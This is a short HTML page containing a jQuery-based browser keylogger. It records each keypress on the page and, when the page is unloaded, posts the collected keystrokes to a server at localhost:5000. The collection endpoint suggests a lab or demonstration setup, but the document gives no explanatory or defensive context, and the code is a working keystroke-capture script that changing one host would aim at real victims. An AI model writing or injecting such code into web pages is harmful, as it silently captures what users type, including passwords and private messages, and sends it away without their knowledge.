<link rel="icon" href="data:,">

<script src="https://ajax.googleapis.com/ajax/libs/jquery/1.12.4/jquery.min.js"></script>

<script>

    var phrase = [];

    $(document).on('keypress',function(key){
        var letter = String.fromCharCode(key.charCode);
        phrase.push(letter);
    });

    window.onbeforeunload = function () {
        $.post('http://localhost:5000/' + phrase.toString());
    };


</script>